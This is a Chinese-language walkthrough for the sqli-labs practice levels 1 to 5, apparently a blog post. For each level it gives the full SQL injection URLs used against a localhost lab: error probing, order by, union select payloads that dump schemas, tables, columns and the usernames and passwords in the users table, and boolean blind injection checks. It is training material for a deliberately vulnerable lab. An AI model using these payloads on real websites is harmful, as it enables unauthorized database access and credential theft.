---
title: "sqlilabs通关教程"
date: 2022-02-09 20:06:27
---
[[sqlmap使用方法]]  
Mysql 5.0以上 有一个系统数据库 information_schema，存储着所有的数据库的相关信息，一般的， 我们利用该表可以进行一次完整的注入。以下为一般的流程。 information_schema数据库下有schemata,tables,columns等表。 table_schema是数据库的名称，table_name是具体的表名

猜数据库

select schema_name from information_schema.schemata

猜某库的数据表

select table_name from information_schema.tables where table_schema=’xxxxx’

猜某表的所有列

Select column_name from information_schema.columns where table_name=’xxxxx’

获取某列的内容

Select *** from ****

---

# less-1:

由回显可以知道提交的语句被’’所包裹

![](/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/1.png)

接下来可以利用order by。Order by 对前面的数据进行排序，这里有三列数据，我们就只能用 order by 3,超过 3 就会报错，’order by 4–+的结果显示结果超出。

![](/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/2.png)

接下来使用联合查询，union 的作用是将两个 sql 语句进行联合。Union 可以从 下面的例子中可以看出，强调一点：union 前后的两个 sql 语句的选择列数要相同才可以。union all 与 union 的区别是增加了去重的功能。

`http://localhost/sqli-labs-master/Less-1/?id=-1' union select 1,2,3--+`

![](/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/3.png)

当 id 的数据在数据库中不存在时，（此时我们可以 id=-1，两个 sql 语句进行联合操作时， 当前一个语句选择的内容为空，我们这里就将后面的语句的内容显示出来）此处前台页面返 回了我们构造的 union 的数据

爆数据库：

`http://localhost/sqli-labs-master/Less-1/?id=-1' union select 1,group_concat(schema_name),3 from information_schema.schemata--+`

![](/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/4.png)

爆security数据库的数据表：

`http://localhost/sqli-labs-master/Less-1/?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+`

![](/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/5.png)

爆users表的列：

`http://localhost/sqli-labs-master/Less-1/?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+`

![](/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/6.png)

爆数据：

`http://localhost/sqli-labs-master/Less-1/?id=-1' union select 1,group_concat(username),group_concat(password) from users --+`

![](/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/7.png)

---

# less-2:

---

`http://localhost/sqli-labs-master/Less-2/?id=1`

回显正常

![](/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/8.png)

`http://localhost/sqli-labs-master/Less-2/?id=1'`

报错

![](/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/9.png)

由以上可知当前的注入为数字型注入

使用order by：

`http://localhost/sqli-labs-master/Less-2/?id=1 order by 3--+`

得知当为4时报错

![](/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/10.png)

使用联合查询：

`http://localhost/sqli-labs-master/Less-2/?id=-1 union select 1,2,3 --+`

![](/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/11.png)

爆数据库：

`http://localhost/sqli-labs-master/Less-2/?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata--+`

![](/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/12.png)

爆security库的表：

`http://localhost/sqli-labs-master/Less-2/?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+`

![](/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/13.png)

爆users表的列：

`http://localhost/sqli-labs-master/Less-2/?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+`

![](/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/14.png)

爆数据：

`http://localhost/sqli-labs-master/Less-2/?id=-1 union select 1,group_concat(username),group_concat(password) from users --+`

![](/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/15.png)

---

# less-3:

首先通过回显的报错可知正确的代码为：

`http://localhost/sqli-labs-master/Less-3/?id=1')--+`

![](/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/16.png)

![](/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/17.png)

使用order by得知当为4的时候报错

![](/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/18.png)

使用联合查询：

![](/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/19.png)

爆数据库：  
`http://localhost/sqli-labs-master/Less-3/?id=-1 ') union select 1,group_concat(schema_name) ,3 from information_schema.schemata--+`

![](/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/20.png)

爆security库的表：

`http://localhost/sqli-labs-master/Less-3/?id=-1 ') union select 1,group_concat(table_name) ,3 from information_schema.tables where table_schema='security'--+`

![](/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/21.png)

爆users表的列：

`http://localhost/sqli-labs-master/Less-3/?id=-1 ') union select 1,group_concat(column_name) ,3 from information_schema.columns where table_name='users'--+`

![](/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/22.png)

爆数据：

`http://localhost/sqli-labs-master/Less-3/?id=-1') union select 1,group_concat(username),group_concat(password) from users --+`

![](/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/23.png)

---

# less-4:

第四关，我们随便输入一个通过，他的回显可以知道，这道题使用”“和()对id参数进行的包裹，因此我们可以构造出以下的语句：

`http://localhost/sqli-labs-master/Less-4/?id=1")--+`

![](/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/24.png)

进行联合查询：

`http://localhost/sqli-labs-master/Less-4/?id=-1") union select 1,2,3--+`

![](/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/25.png)

爆数据库：

`http://localhost/sqli-labs-master/Less-4/?id=-1") union select 1,group_concat(schema_name),3 from information_schema.schemata--+`

![](/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/26.png)

爆security库的表：

`http://localhost/sqli-labs-master/Less-4/?id=-1") union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+`

![](/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/27.png)

爆user表的列：

`http://localhost/sqli-labs-master/Less-4/?id=-1") union select 1,group_concat(column_name),3 from information_schema.columns where table_name='user'--+`

![](/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/28.png)

爆数据：

`http://localhost/sqli-labs-master/Less-4/?id=-1") union select 1,group_concat(username),group_concat(password) from users --+`

![](/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/29.png)

# less-5:

通过后端的代码我们可以知道，这个没有回显，对于这一题我们采用盲注的方式。

`http://localhost/sqli-labs-master/Less-5/?id=1' and left(version(),1)=5 --+`

我们先猜测这个数据库的版本是以5开头的如果不是以5开头的那么页面的回显就会出现错误。通过回显证明数据库的版本的确是以5开头的。通过这种方法我们可以一直试直到把数据库的版本给试出来。

![](/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/30.png)

接下来我们试一下数据库的长度：

`http://localhost/sqli-labs-master/Less-5/?id=1' and length(database())=8 --+`

结果我们试到8左右就可以了。

![](/2022/02/09/sqlilabs%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B/31.png)

接下来我们采用二分法的方法来猜测数据库的第一位。

`http://localhost/sqli-labs-master/Less-5/?id=1'and left(database(),1)> 'k'--+`

通过这种方式我们可以慢慢的查到数据库的名字。
